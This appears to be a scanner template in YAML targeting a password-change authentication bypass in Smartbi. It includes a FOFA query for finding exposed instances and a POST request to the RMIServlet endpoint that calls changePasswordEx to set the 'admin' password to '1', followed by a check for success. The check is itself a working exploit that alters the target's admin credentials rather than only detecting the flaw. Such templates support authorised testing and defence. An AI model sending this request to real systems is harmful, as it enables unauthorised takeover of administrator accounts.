id: smartbi-changepassword-bypass

info:
  name: Smartbi修改用户密码
  author: zan8in
  severity: high
  verified: false
  description: |-
    Smartbi修改用户密码漏洞
    fofa: title="Smartbi"
  tags: smartbi,bypass
  created: 2024/11/14

rules:
  r0:
    request:
      method: POST
      path: /smartbi/vision/RMIServlet
      body: |
        className=UserService&methodName=changePasswordEx&params=["admin","","1"]
    expression: response.status == 200 && response.body.bcontains(b'"retCode":0') && response.body.bcontains(b'"duration":')
  r1:
    request:
      method: GET
      path: /smartbi/vision/index.jsp
    expression: response.status == 200 && response.body.bcontains(b'重置密码')
expression: r0() && r1()
